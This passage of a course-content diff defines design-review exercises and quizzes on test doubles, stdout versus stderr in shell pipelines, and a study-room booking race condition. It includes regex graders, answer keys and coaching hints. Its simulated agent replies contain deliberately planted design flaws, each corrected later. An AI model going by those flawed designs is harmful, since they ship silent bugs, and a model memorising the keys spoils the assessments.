+        fix: "Replace PushStub with a Test Spy that records each send(student, text) call, and assert that exactly one alert went to \"ana\" with the text \"Dryer D7 is done\" (or use a Mock Object that expects that call). Keep RosterStub for the indirect input."
+        accept_fixes:
+          - "a Mock Object that expects send(\"ana\", \"Dryer D7 is done\")"
+          - "record the sent notifications and assert recipient and text"
+      signals:
+        flaw: ["indirect output", "\\bspy\\b", "\\bmock", "\\bstub", "observ", "can'?t (see|tell|check)", "cannot (see|tell|check)", "never (sees|checks|looks)", "doesn'?t (check|see|verify|look)", "only (checks|asserts|looks|tests)", "queued", "return(s|ed)? value", "weak assert", "who (gets|got|receives)", "recipient", "which student", "\\bwhom\\b"]
+        consequence: ["pass", "green", "\\bships?\\b", "\\bben\\b", "wrong (student|person|recipient|dryer|text|phone)", "\\bd6\\b", "never (told|notified|gets|hears|alerted)", "no (alert|notification)", "dumped", "floor", "(doesn'?t|won'?t|not) catch", "unnoticed", "\\bmiss"]
+        fix: ["\\bspy\\b", "\\bmock", "record", "captur", "assert[^.]*\\b(ana|recipient|student|text|message|d7|arguments?)\\b", "check[^.]*\\b(recipient|student|text|message|arguments?)\\b", "verif[^.]*\\b(recipient|student|text|message|arguments?|call)\\b"]
+      anchors:
+        - { label: "PushStub", pattern: "push ?stub" }
+        - { label: "assert result == \"queued\"", pattern: "assert|queued" }
+        - { label: "send(\"ana\", \"Dryer D7 is done\")", pattern: "\\bsend\\s*\\(|\\bsend (call|message)" }
+        - { label: "CycleFinishedTest", pattern: "cycle ?finished ?test|test_cycle_finished" }
+      coach:
+        flaw:
+          - "What does the test assert? Which part of the acceptance criteria could that assertion ever check?"
+          - "Follow the alert: where does send(\"ana\", \"Dryer D7 is done\") end up, and what comes back to the test from there?"
+          - "Complete: “The test asserts only ___, but the alert itself goes to ___, so the test never sees ___.”"
+        consequence:
+          - "The bug is pushed. Does the test pass or fail, and why?"
+          - "With the bug, whoStarted(\"D6\") answers \"ben\". What does PushStub return for Ben's alert, and what does the assertion compare?"
+          - "Complete: “Because PushStub returns ___ for every send(), the test ___, so the bug ___, and Ana ___.”"
+        fix:
+          - "Keep what the agent got right (no real phones, fast, repeatable) and change what the test can check."
+          - "A stub decides what the service receives. What kind of test double lets the test see what the service sent?"
+          - "Name the double that replaces PushStub, what it records or expects, and the assertion about Ana and D7."
+      wrong_claims:
+        - patterns: ["roster ?stub (is|should|must|returns?)", "replace (the )?roster", "roster[^.]*(wrong|incorrect|bad)"]
+          note: "RosterStub is the right double: whoStarted() feeds AlertService an input, and the stub controls it. The weak spot is the other direction, the alert going out to PushStub."
+        - patterns: ["real (push|service|notification|api|phone)", "actual (push|service|notification|api)", "end.?to.?end", "integration test"]
+          note: "Calling the real push service from CI would ping real phones, cost money, and fail whenever that service is down, with no bug in the code. A test double can check the alert without any of that."
+        - patterns: ["less often", "too often", "nightly", "every push is"]
+          note: "How often the test runs is not the problem: a test that cannot fail on this bug stays green on every run."
+        - patterns: ["not none", "not null", "is truthy", "status code", "returns? true"]
+          note: "Any check on the returned value checks the same thing: that something was queued. Whom the alert went to and what it said never reach the test."
+      lesson:
+        principle: "Verify Indirect Outputs With a Spy or Mock"
+        definition: |
+          **Indirect output:** SUT → DOC. The test cannot observe it. **Indirect input:** DOC → SUT. The test cannot control it. So replace the DOC with a test double that the test controls: a **Test Stub** sends the desired inputs to the SUT, a **Test Spy** forwards the indirect outputs to the test, and a **Mock Object** verifies the indirect outputs. And **write strong assertions** that test all aspects of the specification.
+        ask: |
+          **Ask:** what does this test let me observe: inputs I control, or outputs I can check?
+        flaw: |
+          The alert *is* an indirect output: `AlertService` sends it to the push service, not back to the test. `PushStub` answers `"queued"` to any `send()`, and the test asserts only `result == "queued"`, so it cannot see whom the alert went to or what it said. With the Given bug, D7's alert goes to Ben, the test still passes, and the bug ships.
+        fix: |
+          Replace `PushStub` with a **Test Spy** that records every `send(student, text)` call, and assert that exactly one alert went to `"ana"` with the text `"Dryer D7 is done"`. A **Mock Object** that expects this call works too. Keep `RosterStub`: it correctly controls the indirect input.
+        more: |
+          Everything the agent praised is true: no phone gets pinged, and the test is fast and repeatable. Using doubles instead of real services was the right move; this test just stubbed out the very output it was meant to check.
+      annotated:
+        label: "The flaw, annotated"
+        type: sequence
+        source: |
+          @startuml
+          layout compact
+          participant test as : CycleFinishedTest
+          participant svc: AlertService
+          participant roster: RosterStub
+          participant push: PushStub #FFE0B2
+
+          test -> svc: cycleFinished("D7")
+          activate svc
+          svc -> roster: whoStarted("D7")
+          activate roster
+          note right of roster
+          Test Stub roster:
+          D6 started by "ben",
+          D7 started by "ana".
+          end note
+          roster --> svc: "ana"
+          deactivate roster
+          svc -> push: send("ana", "Dryer D7 is done")
+          activate push
+          note right of push
+          Test Stub: returns "queued"
+          for any send(), so CI never
+          pings a real phone.
+          end note
+          push --> svc: "queued"
+          deactivate push
+          svc --> test: "queued"
+          deactivate svc
+          note right of test : assert result == "queued"
+          callout bottom of text "send(\"ana\", \"Dryer D7 is done\")" : The alert goes to PushStub, which records nothing, so the test never sees whom it went to or what it said.
+          callout right of text "assert result == \"queued\"" : Passes for any send(), even to the wrong student or about the wrong dryer.
+          @enduml
+      fixed:
+        label: "The fixed design"
+        type: sequence
+        source: |
+          @startuml
+          layout compact
+          participant test as : CycleFinishedTest
+          participant svc: AlertService
+          participant roster: RosterStub
+          participant push: PushSpy
+
+          test -> svc: cycleFinished("D7")
+          activate svc
+          svc -> roster: whoStarted("D7")
+          activate roster
+          note right of roster
+          Test Stub roster:
+          D6 started by "ben",
+          D7 started by "ana".
+          end note
+          roster --> svc: "ana"
+          deactivate roster
+          svc -> push: send("ana", "Dryer D7 is done")
+          activate push
+          note right of push
+          Test Spy: records each send()
+          and returns "queued"; still
+          no real phone.
+          end note
+          push --> svc: "queued"
+          deactivate push
+          svc --> test: "queued"
+          deactivate svc
+          test -> push: sent()
+          activate push
+          push --> test: [("ana", "Dryer D7 is done")]
+          deactivate push
+          note right of test : assert sent == [("ana", "Dryer D7 is done")]
+          @enduml
+    quiz:
+      title: "Step 3 — Knowledge Check"
+      min_score: 0.8
+      questions:
+        - type: single
+          difficulty: basic
+          question: "In a unit test, the behavior to check is an indirect output: a message the system under test (SUT) sends to a depended-on component (DOC). Which setup lets the test check that message?"
+          options:
+            - "Replace the DOC with a Test Spy and assert on the calls it recorded."
+            - "Replace the DOC with a Test Stub that returns a fixed reply, and assert on the reply."
+            - "Assert on the SUT's return value, which shows whether the message went out."
+            - "Use the real DOC, so that the message really arrives."
+          correct_index: 0
+          option_feedback:
+            1: "A stub controls what the SUT receives. Its fixed reply comes back whatever the SUT sent, so the test still cannot see the message."
+            2: "The return value is a direct output. It can look the same whether the message went to the right place or the wrong one."
+            3: "The test still cannot see what the real DOC received, and every run would depend on that service being up and could cost money."
+          explanation: "A Test Spy replaces the DOC and forwards the indirect outputs to the test, which then asserts on them. A Mock Object, which verifies the expected calls itself, works too; a Test Stub only controls indirect inputs."
+        - type: single
+          difficulty: intermediate
+          question: |
+            An agent's UML sequence diagram of a pytest test for a campus coffee cart: the test calls `orderReady(42)`; `OrderService` asks `OrdersStub` who placed order 42 (it answers `"maya"`) and calls `send(phone, "Order 42 is ready")` on `SmsStub`, which returns `True` for any message. The test asserts `orderReady(42) is True`. A bug texts the next customer in line instead of Maya. What happens when the test runs?
+          options:
+            - "It passes, because `SmsStub` returns `True` for any message."
+            - "It fails, because `OrdersStub` answers `\"maya\"` for order 42."
+            - "It fails, because `SmsStub` rejects a phone number that is not Maya's."
+            - "It fails, because texting the wrong customer makes `orderReady(42)` return `False`."
+          correct_index: 0
+          option_feedback:
+            1: "The stub feeds the right customer into `OrderService`, but the bug sends the text elsewhere afterwards, and nothing in the test looks at where it went."
+            2: "A stub does not check its arguments: it returns its fixed reply for any call, so a wrong phone number goes unnoticed."
+            3: "`orderReady(42)` returns whatever `SmsStub` returns, which is `True` for any message, so the return value cannot reveal the wrong recipient."
+          explanation: "Whom the text goes to is an indirect output. The stub answers `True` no matter what it receives, and the assertion checks only that answer, so the test passes with the bug. A Test Spy that records `send()` calls, with an assertion on Maya's number and the text, would fail."
+        - type: single
+          difficulty: intermediate
+          question: "A student reports that a laundry app's dryer alert went to the wrong person. Which plan follows the systematic debugging process and also tests the test?"
+          options:
+            - "Reproduce the bug with a test that fails on the current code, then fix the code until it passes."
+            - "Find the root cause in the code, fix it, then write a test that passes on the fixed code."
+            - "Deploy a quick fix that turns the alerts off, then ask the student whether it still happens."
+            - "Write a test, check that it passes on the current code, then fix the code."
+          correct_index: 0
+          option_feedback:
+            1: "This skips the first step, reproducing the bug, and the test is never seen failing, so nothing shows that it can detect this bug at all."
+            2: "Turning the alerts off hides the symptom and breaks the feature for everyone; it neither reproduces nor fixes the bug."
+            3: "A test that passes on the buggy code does not reproduce the bug. It should fail first; seeing it fail is what tests the test."
+          explanation: "Debugging starts by reproducing the bug reliably, ideally with an automated bug reproduction test. Watching that test fail on the current code shows that it can detect the bug (testing the test); after the fix, the same test passing shows the bug is gone."
+        - type: single
+          difficulty: intermediate
+          question: "In a UML sequence diagram, `ana: Browser` sends `GET /grades` to `server: GradesServer` a minute after logging in. With HTTP, what lets the server know that this request comes from Ana?"
+          options:
+            - "Only what the request carries, such as a session ID cookie."
+            - "The lifeline name `ana`, since the diagram shows who sends the request."
+            - "The open connection from the login, which identifies her browser."
+            - "Its memory of the most recent login, since Ana logged in a minute ago."
+          correct_index: 0
+          option_feedback:
+            1: "The lifeline name is for the readers of the diagram. The server sees only the request itself."
+            2: "HTTP treats each request as independent, and a connection can close and reopen at any time; it does not prove who logged in."
+            3: "Another student may have logged in since. One “most recent login” is shared by every request, so it cannot tell Ana's request from anyone else's."
+          explanation: "HTTP is stateless: the server doesn't remember earlier requests from the same client. Only what each request carries, such as a session ID in a cookie or a signed token, can link it to an authenticated user."
+
+  # ==========================================================================
+  # STEP 4: UCLA Radio weekly Top 10 (streams: diagnostics belong on stderr)
+  # ==========================================================================
+  # Pedagogy: fading completed, interleaving. The default task replaces the
+  # sentence starters, so the learner now structures the comment alone. The
+  # view switches to a component diagram with ports, drawn in L2's own
+  # notation (slide 12: stdin, stdout, and stderr ports; pipes connect
+  # them), and the concept switches to shell streams, so the learner must
+  # decide which concept applies. The second acceptance criterion keeps the
+  # warnings required, which rules out "just delete them" as a fix. The
+  # knowledge check reaches L3's shared class attribute (an underlined UML
+  # attribute) and spaces step 3's test doubles.
+  - title: "Review 4: UCLA Radio Weekly Top 10"
+    key: radio-top10-pipeline
+    estimated_minutes: 12
+    instructions: |
+      ### Why this matters
+
+      Small programs chained together are only as reliable as what flows between them. Reviewing each connection in a component diagram catches bugs that no single program's tests reveal.
+
+      ### 🎯 You will learn to
+
+      - Trace data through a component diagram, port by port, for a Given input.
+      - Write a complete review comment without sentence starters.
+
+      From here on, the review box gives no sentence starters: structure your comment yourself.
+    design_review:
+      min_words: 30
+      request: |
+        "Build the job that makes UCLA Radio's weekly Top 10 chart from the DJ console's play log. Show me a component diagram of it before you write any code."
+      story: |
+        **As** UCLA Radio's music director, **I want** a weekly Top 10 of the most played songs, **so that** I can post the chart on Instagram every Monday.
+      acceptance_criteria:
+        - "**Given** last week's play log, **when** the chart job runs, **then** `top10.txt` lists exactly ten songs with their play counts."
+        - "**Given** a log line that cannot be parsed, **when** the chart job runs, **then** the line is skipped and a warning is kept for the station's tech team."
+      reply: |
+        Here is the weekly chart job, `weekly_chart.sh`, as a pipeline of small programs:
+
+        - **`extract_plays.py`** reads the log as UTF-8 and prints one `Artist - Title` line per play, in Title Case, so "Kiss Me" and "kiss me" count as one song.
+        - **Nothing fails silently:** a log line it cannot parse prints a warning instead of vanishing.
+        - **`sort | uniq -c | sort -rn | head -n 10`** counts the plays and keeps the ten most played songs.
+        - **Streams end to end:** no temporary files. cron runs the job every Monday at 6:00 and writes `top10.txt`.
+
+        Want me to add a script that posts the chart to Instagram?
+      given: |
+        On Thursday, the DJ console glitched and wrote **300 truncated lines** into the play log. Last week's most played song had **41 plays**. Trace Monday's run through the diagram: what does `top10.txt` list?
+      diagrams:
+        - id: radio-top10-components
+          type: component
+          label: "Weekly chart pipeline (component diagram)"
+          source: |
+            @startuml
+            layout compact
+            top to bottom direction
+            component "extract_plays.py" as extract <<Python script>> {
+              portout "stdout" as e_out
+              portout "stderr" as e_err
+            }
+            component "sort" as sort1
+            component "uniq -c" as uniq
+            component "sort -rn" as sort2
+            component "head -n 10" as head
+            component "top10.txt" as top10 <<file>>
+            e_out --> sort1
+            sort1 --> uniq
+            uniq --> sort2
+            sort2 --> head
+            head --> top10
+            note bottom of extract
+            print() writes each play to stdout
+            as Artist - Title. For a line it
+            cannot parse, print() writes
+            WARN: skipped malformed line.
+            end note
+            @enduml
+      key:
+        flaw: "extract_plays.py prints its diagnostics (\"WARN: skipped malformed line\") to stdout, the data stream that pipes into sort and uniq -c, so the warnings are counted like plays. Its stderr port, the stream for messages to people, is unused."
+        consequence: "The 300 truncated lines become 300 identical WARN lines on stdout. uniq -c counts them as one \"song\" with 300 plays, sort -rn ranks it above the real #1 (41 plays), and head -n 10 keeps it: top10.txt lists only nine real songs and a warning."
+        fix: "Write warnings to stderr with print(..., file=sys.stderr) and redirect that stream to a log file (2> chart-errors.log), so stdout carries only one \"Artist - Title\" line per play into sort and the tech team still gets every warning."
+        accept_fixes:
+          - "log warnings to a separate file instead of stdout"
+          - "Python's logging module, which writes to stderr"
+      signals:
+        flaw: ["stdout", "standard out", "stderr", "standard error", "error stream", "data stream", "\\bwarn", "diagnos", "same stream", "\\bmix", "pipe(s|d)? (into|to)", "counted", "\\bprint"]
+        consequence: ["300", "number one", "#\\s?1\\b", "top spot", "first place", "\\bnine\\b", "\\b9 (real )?songs", "count(s|ed)?\\b", "most played", "instead of a (real )?song", "fake song", "not ten", "only nine"]
+        fix: ["stderr", "standard error", "sys\\.stderr", "file\\s*=\\s*sys", "2\\s*>", "error stream", "log file", "\\blogging\\b", "separate (stream|file)"]
+      anchors:
+        - { label: "extract_plays.py", pattern: "extract[_ ]?plays" }
+        - { label: "stdout", pattern: "stdout|standard out" }
+        - { label: "stderr", pattern: "stderr|standard error" }
+        - { label: "uniq -c", pattern: "uniq" }
+        - { label: "WARN: skipped malformed line", pattern: "\\bwarn" }
+      coach:
+        flaw:
+          - "Read the note on extract_plays.py. Where does each line it prints go next?"
+          - "Follow one WARN line from extract_plays.py through sort, uniq -c, and sort -rn. What does each program do with it?"
+          - "Complete: “extract_plays.py writes ___ to ___, so sort receives ___ mixed in with ___.”"
+        consequence:
+          - "Run the Given week through the pipeline. How many WARN lines reach uniq -c?"
+          - "Compare the count uniq -c gives the WARN line with last week's most played song (41 plays). Where does it land in the chart?"
+          - "Complete: “uniq -c counts ___ as one song with ___ plays, so top10.txt lists ___ and only ___ real songs.”"
+        fix:
+          - "Your fix has to keep the warning for the tech team and keep it out of the chart."
+          - "extract_plays.py has a port that nothing is connected to. What is it for, and where should it lead?"
+          - "Say which stream each kind of line should use, and how weekly_chart.sh sends the warnings to a file."
+      wrong_claims:
+        - patterns: ["uniq[^.]*before[^.]*sort", "sort[^.]*after[^.]*uniq", "remove (the first )?sort", "swap (sort|uniq)"]
+          note: "uniq -c merges only adjacent identical lines, so sort has to come first; the agent's order is right. The problem is what enters the pipeline."
+        - patterns: ["(one|single|a) python (script|program)", "(all|everything) in python", "rewrite[^.]*python", "replace the (pipeline|shell|commands)"]
+          note: "Any program that counts lines would count the warnings too, as long as they arrive on the data stream. The pipeline's shape is not the problem."
+        - patterns: ["2\\s*>\\s*&\\s*1"]
+          note: "2>&1 sends stderr into stdout, so the warnings would join the data stream again."
+        - patterns: ["grep -v", "filter (out )?(the )?warn", "skip lines (that )?start"]
+          note: "Filtering one message's text patches this warning only; the next diagnostic with different words would be counted again."
+      lesson:
+        principle: "Keep Diagnostics Out of the Data Stream"
+        definition: |
+          **Write programs to handle text streams, because that is a universal interface.** Every program has a standard input stream port (**stdin**), a standard output stream port (**stdout**), and a standard error stream port (**stderr**); by connecting ports of multiple commands, you can create a larger program. **stdout** carries a program's output to the next program; **stderr** carries messages for people, and `cmd 2> file` writes them to a file. In Python, `print(..., file=sys.stderr)` separates diagnostics from useful output.
+        ask: |
+          **Ask:** if this message flows into the next program, what does that program do with it?
+        flaw: |
+          `extract_plays.py` prints `WARN: skipped malformed line` with `print()`, so the warning goes to **stdout**, the stream that carries plays into `sort`. `uniq -c` counts the 300 identical warnings as one song with 300 plays, `sort -rn` ranks it above the real #1 (41 plays), and `head -n 10` keeps it: the chart has nine songs and a warning.
+        fix: |
+          Print warnings with `print(..., file=sys.stderr)`, and send that stream to a log file in `weekly_chart.sh`:
+
+          ```bash
+          python3 extract_plays.py plays.log 2> chart-errors.log | sort | uniq -c | sort -rn | head -n 10 > top10.txt
+          ```
+
+          stdout then carries only plays, and the tech team still gets every warning.
+        more: |
+          Printing a warning for every skipped line was a good instinct: silent data loss is worse. The warning just went to the stream that the next program reads.
+      annotated:
+        label: "The flaw, annotated"
+        type: component
+        source: |
+          @startuml
+          layout compact
+          top to bottom direction
+          component "extract_plays.py" as extract <<Python script>> #FFE0B2 {
+            portout "stdout" as e_out
+            portout "stderr" as e_err
+          }
+          component "sort" as sort1
+          component "uniq -c" as uniq
+          component "sort -rn" as sort2
+          component "head -n 10" as head
+          component "top10.txt" as top10 <<file>>
+          e_out --> sort1
+          sort1 --> uniq
+          uniq --> sort2
+          sort2 --> head
+          head --> top10
+          note bottom of extract
+          print() writes each play to stdout
+          as Artist - Title. For a line it
+          cannot parse, print() writes
+          WARN: skipped malformed line.
+          end note
+          callout top of element uniq : uniq -c counts identical WARN lines like plays of one song.
+          callout bottom of element extract.e_err : Unused: the warnings travel on stdout instead.
+          @enduml
+      fixed:
+        label: "The fixed design"
+        type: component
+        source: |
+          @startuml
+          layout compact
+          component "extract_plays.py" as extract <<Python script>> {
+            portout "stdout" as e_out
+            portout "stderr" as e_err
+          }
+          component "sort" as sort1
+          component "uniq -c" as uniq
+          component "sort -rn" as sort2
+          component "head -n 10" as head
+          component "top10.txt" as top10 <<file>>
+          component "chart-errors.log" as errlog <<file>>
+          e_out --> sort1
+          sort1 --> uniq
+          uniq --> sort2
+          sort2 --> head
+          head --> top10
+          e_err --> errlog : 2>
+          @enduml
+    quiz:
+      title: "Step 4 — Knowledge Check"
+      min_score: 0.8
+      questions:
+        - type: single
+          difficulty: basic
+          question: "In a shell pipeline such as `python3 extract.py log | sort | uniq -c`, which stream should `extract.py` use for each kind of line it prints?"
+          options:
+            - "Data lines on stdout; warnings on stderr"
+            - "Data lines and warnings on stdout, so nothing gets lost"
+            - "Warnings on stdout before any data, so people see them first"
+            - "Data lines on stderr; warnings on stdout"
+          correct_index: 0
+          option_feedback:
+            1: "Everything on stdout flows into `sort` and `uniq -c`, so the warnings are counted as data. stderr is not lost: it reaches the terminal, or a file with `2> errors.log`."
+            2: "Order does not matter to `sort`: every line on stdout is data for the next program, so the warnings are still counted."
+            3: "The pipe connects stdout to the next program's stdin, so the data would never reach `sort`, and the warnings would be counted instead."
+          explanation: "stdout carries a program's output to the next program in the pipeline; stderr carries messages for people. In Python, `print(..., file=sys.stderr)` sends a warning to stderr."
+        - type: single
+          difficulty: advanced
+          question: |
+            A UML component diagram of a CS 35L autograder shows `run_tests.py | grade.py > scores.csv`. `run_tests.py` prints one `uid,passed` line per student on stdout, and when a test hangs it also prints `Timeout: test_7 took 30 s` on stdout. `grade.py` turns every line it reads into a row of `scores.csv`. Which change fixes the design?
+          options:
+            - "Print the timeout to stderr and redirect it with `2> timeouts.log`."
+            - "Add `2>&1` after `run_tests.py` so that no message is lost."
+            - "Make `grade.py` skip every line that starts with `Timeout`."
+            - "Print the timeout message before any `uid,passed` lines."
+          correct_index: 0
+          option_feedback:
+            1: "`2>&1` sends stderr into stdout, the stream `grade.py` reads, so any message on stderr would become a row too."
+            2: "This patches one message; the next diagnostic with different words, such as an import error, still becomes a row of `scores.csv`."
+            3: "`grade.py` reads every line on stdout wherever it appears, so the timeout still becomes a row."
+          explanation: "The timeout is a message for people, so it belongs on stderr. With `2> timeouts.log`, stdout carries only `uid,passed` lines into `grade.py`, and the course staff still get every timeout."
+        - type: single
+          difficulty: intermediate
+          question: |
+            An agent's UML class diagram shows `Playlist` with the underlined attribute `songs: list = []`, a class (static) attribute. In the Python code, `songs = []` sits in the class body, and `add(song)` calls `self.songs.append(song)`. Two DJs each create a `Playlist` and add their own songs. What happens?
+          options:
+            - "Both playlists show every song, because they share one list."
+            - "Each playlist shows only its own songs, because each object gets a copy."
+            - "Only the second DJ's songs remain, because `Playlist()` resets the list."
+            - "The second `Playlist()` raises an error, because `songs` already exists."
+          correct_index: 0
+          option_feedback:
+            1: "Class attributes are not copied into instances. `self.songs.append` finds `songs` on the class and changes that one list; `append` assigns nothing, so no instance attribute appears."
+            2: "Creating an instance does not run the class body again: `songs = []` runs once, when the class is defined."
+            3: "Creating a second instance is fine; both instances look up the same class attribute."
+          explanation: "An underlined UML attribute belongs to the class, and so does a Python attribute assigned in the class body: both playlists append to one shared list. For a list per playlist, assign `self.songs = []` in `__init__`."
+        - type: single
+          difficulty: intermediate
+          question: "A pytest test replaces a payment service with a Test Stub that returns `\"approved\"` for any charge, and asserts that `checkout(cart)` returns `\"approved\"`. Which bug would still pass this test?"
+          options:
+            - "`checkout()` charges the wrong amount."
+            - "`checkout()` returns `\"declined\"` when the stub approves."
+            - "`checkout()` crashes before it calls the payment service."
+            - "`checkout()` ignores the reply and always returns `\"pending\"`."
+          correct_index: 0
+          option_feedback:
+            1: "The return value is a direct output, and the assertion checks it, so a wrong return value fails the test."
+            2: "A crash raises an exception inside the test, so the test fails."
+            3: "The assertion compares the return value with `\"approved\"`, so `\"pending\"` fails it."
+          explanation: "The amount charged is an indirect output: it goes to the payment service, and the stub answers the same way whatever the amount. The assertion checks only the direct output, the return value. A Test Spy that records the charge would catch the wrong amount."
+
+  # ==========================================================================
+  # STEP 5: Powell study rooms (isolation: let the database decide)
+  # ==========================================================================
+  # Pedagogy: interleaved review with the default task (fading: no sentence
+  # starters). The Given supplies timings so the learner can replay two
+  # requests on one timeline; that trace turns "every call is correct" into
+  # a concrete double booking. L8 explains it (slide 3, simultaneous edits;
+  # slides 22 and 25-26, transactions, consistency, isolation). L14's section
+  # swap review is about atomicity, a crash between two writes; here nothing
+  # crashes, so the learner must discriminate the two. The knowledge check
+  # spaces step 2 (stateless HTTP) and reaches the CAP theorem (L8 slides
+  # 30-33), which has no review of its own.
+  - title: "Review 5: Powell Study Room Booking"
+    key: study-room-booking
+    estimated_minutes: 11
+    instructions: |
+      ### Why this matters
+
+      A sequence diagram shows one tidy run of a feature. Replaying the Given scenario through it, message by message, is how a reviewer checks the agent's promises instead of taking them on trust.
+
+      ### 🎯 You will learn to
+
+      - Evaluate a sequence diagram by replaying the Given scenario through it, message by message.
+      - Write a complete review comment, with the flaw, what goes wrong, and the fix, in your own words.
+
+      Read the agent's reply as a list of claims, not facts: your trace of the Given can confirm or refute each one.
+    design_review:
+      min_words: 35
+      request: |
+        "Design the booking backend for Powell Library's group study rooms. Show me a sequence diagram of one booking before you write any code."
+      story: |
+        **As a** student, **I want** to book a Powell study room for my group, **so that** we have a quiet place to prepare before the midterm.
+      acceptance_criteria:
+        - "**Given** a room slot is free, **when** I book it, **then** I see a confirmation and get an email with the room and time."
+        - "**Given** a room slot is free, **when** two students book it at the same time, **then** exactly one booking succeeds and the other student sees that the slot was just taken."
+      reply: |
+        Here is the booking flow:
+
+        - **`BookingAPI` checks before it books:** it counts the slot's bookings and inserts only when the count is 0, so a slot can never be booked twice.
+        - **Each query commits on its own** (autocommit), so no long transaction holds up other students during the midterm rush.
+        - **`409 Conflict` with "just taken"** when the slot is booked, so the page can suggest the next free slot.
+        - **The confirmation email is sent asynchronously**, so a slow mail server never delays a booking.
+        - **Every query is parameterized**, so a room name cannot inject SQL.
+
+        Want me to write the Express routes next?
+      given: |
+        Room 4C has one free slot left on Thursday, 7–9 pm. Ana and Ben both click **Book** for it: their requests reach `BookingAPI` 2 ms apart, and during the midterm rush each database call takes about 5 ms. Trace both requests through the diagram. What does each of them see?
+      diagrams:
+        - id: study-room-booking-sequence
+          type: sequence
+          label: "Booking flow (sequence diagram)"
+          source: |
+            @startuml
+            layout compact
+            participant ana: Browser
+            participant api: BookingAPI
+            participant db: RoomsDB
+            participant mail: EmailService
+            ana -> api: POST /bookings (4C, Thu 7-9 pm)
+            activate api
+            api -> db: countBookings(room, slot)
+            activate db
+            db --> api: 0
+            deactivate db
+            note left of api
+              Each query commits on its
+              own, so no long transaction
+              blocks the midterm rush.
+            end note
+            alt [count == 0]
+              api -> db: insertBooking(room, slot, group)
+              activate db
+              db --> api: ok
+              deactivate db
+              api ->> mail: sendConfirmation(group)
+              api --> ana: 201 Booked
+            else [count > 0]
+              api --> ana: 409 Conflict: just taken
+            end
+            deactivate api
+            @enduml
+      key:
+        flaw: "BookingAPI checks the slot with countBookings and books it with a separate insertBooking, each committing on its own, and RoomsDB has no rule against two bookings of one slot. Nothing makes the check and the insert one isolated step, so concurrent requests can run between them."
+        consequence: "Ben's countBookings runs before Ana's insertBooking commits, so both counts return 0, both inserts succeed, and both students see 201 Booked. Two groups show up for room 4C on Thursday at 7 pm, so 'exactly one booking succeeds' fails."
+        fix: "Let the database decide in one step: a UNIQUE (room, slot) constraint, so RoomsDB declines the second insert and BookingAPI answers 409 just taken; or the check and the insert in one transaction with full (serializable) isolation."
+        accept_fixes:
+          - "a unique index on (room, slot), with the duplicate error mapped to 409"
+          - "lock the slot (for example a per-slot row with SELECT ... FOR UPDATE) inside one transaction"
+      signals:
+        flaw: ["concurren", "simultaneous", "same (time|moment|instant)", "at once", "\\brace\\b", "race condition", "interleav", "isolat", "in between", "between (the |ana'?s |ben'?s |her |his )?(count|check|query|select|insert)", "(two|2) (separate )?(queries|statements|calls|steps|transactions)", "separate (queries|statements|calls|steps|transactions)", "auto.?commit", "commits? on its own", "transaction", "atomic", "unique", "constraint", "check.{0,30}(then|before|and).{0,30}(insert|book)", "both (requests|students|users|calls|counts?)"]
+        consequence: ["\\bboth\\b", "double.?book", "booked twice", "(two|2) (groups|bookings|students|rows)", "twice", "same (room|slot)", "(nobody|no one|neither).{0,40}(409|just taken|conflict)", "show up"]
+        fix: ["unique", "constraint", "serializ", "transaction", "\\block", "for update", "atomic", "(one|single) (step|statement|query|operation)", "let the (database|db)", "(database|db|roomsdb) (decide|enforce|reject|refuse|decline)", "primary key"]
+      anchors:
+        - { label: "countBookings", pattern: "count ?bookings" }
+        - { label: "insertBooking", pattern: "insert ?booking" }
+        - { label: "the [count == 0] guard", pattern: "count ?(==|=|is) ?0" }
+        - { label: "BookingAPI", pattern: "booking ?api" }
+        - { label: "RoomsDB", pattern: "rooms? ?db" }
+      coach:
+        flaw:
+          - "Look at how BookingAPI decides that the slot is free and how it then books it. How many separate database calls is that, and does anything tie them together?"
+          - "Put both requests on one timeline with the Given's numbers: Ana's countBookings runs from 0 to 5 ms, Ben's from 2 to 7 ms. When does Ana's insert happen, and what does each count return?"
+          - "Complete: “BookingAPI checks with ___ and books with ___. Because each call ___, Ben's ___ can run before Ana's ___.”"
+        consequence:
+          - "Go back to the Given: what does Ana's browser show, and what does Ben's?"
+          - "After both requests finish, how many bookings does room 4C have for Thursday, 7–9 pm? Which acceptance criterion does that break?"
+          - "Complete: “Both counts return ___, so ___; on Thursday at 7 pm, ___.”"
+        fix:
+          - "Propose a change that works however the two requests interleave, not a faster check or a second one."
+          - "Which part of the design sees every booking of room 4C, and could refuse the second one?"
+          - "Name a rule or a single step in RoomsDB that refuses a second booking of the same slot, and say what BookingAPI then answers Ben."
+      wrong_claims:
+        - patterns: ["inject", "sanitiz"]
+          note: "Every query is parameterized, so injection is not the risk here. Look at what happens when two valid requests arrive at nearly the same moment."
+        - patterns: ["crash", "power", "outage", "server (goes )?down", "fails? (between|after|midway)"]
+          note: "Nothing crashes in the Given: every call succeeds, and the result is still wrong. The question is what another request can do between two successful calls."
+        - patterns: ["(check|recheck|verify|validat)\\w* .{0,25}in the (browser|client|front.?end)", "(browser|client|front.?end) (should|could|must) (check|recheck|verify|validat)"]
+          note: "Ana's and Ben's browsers both see a free slot before they send. Only the database sees both bookings, so only it can refuse the second."
+        - patterns: ["delay", "sleep", "wait \\d", "retr(y|ies)", "timeout"]
+          note: "A delay or a retry moves the gap between the count and the insert, but two requests can still fall into it. The fix has to make the gap impossible."
+      lesson:
+        principle: "Let the Database Serialize Competing Writes"
+        definition: |
+          **Isolation:** concurrent transactions do not interfere with each other. A database is built for "multiple simultaneous edits to the same data", but only for what it sees as one transaction or one of its own rules: a constraint every write must satisfy, "otherwise, the transaction is declined." A check and a write sent as two separate statements are two transactions, and other requests can run between them.
+        ask: |
+          **Ask:** what if two users do this at the same moment?
+        flaw: |
+          `BookingAPI` checks the slot with `countBookings` and books it with a separate `insertBooking`; each call commits on its own, and `RoomsDB` has no rule against a second booking. With the Given's timings, Ben's count runs from 2 to 7 ms, before Ana's insert has committed: both counts return 0, both inserts succeed, and both students see `201 Booked`. Two groups show up for room 4C.
+        fix: |
+          Let the database decide in one step. Add a `UNIQUE (room, slot)` constraint: `BookingAPI` just inserts, `RoomsDB` declines the second booking of the slot, and `BookingAPI` answers that request with `409 just taken`. One transaction around the count and the insert works too, but only with full isolation (`SERIALIZABLE`): at a database's usual default level, both counts can still see 0.
+        more: |
+          Every call was correct, and a test with one student at a time passes. The agent's promise, "a slot can never be booked twice", holds only while requests take turns.
+      annotated:
+        label: "The flaw, annotated"
+        type: sequence
+        source: |
+          @startuml
+          layout compact
+          participant ana: Browser
+          participant api: BookingAPI #FFE0B2
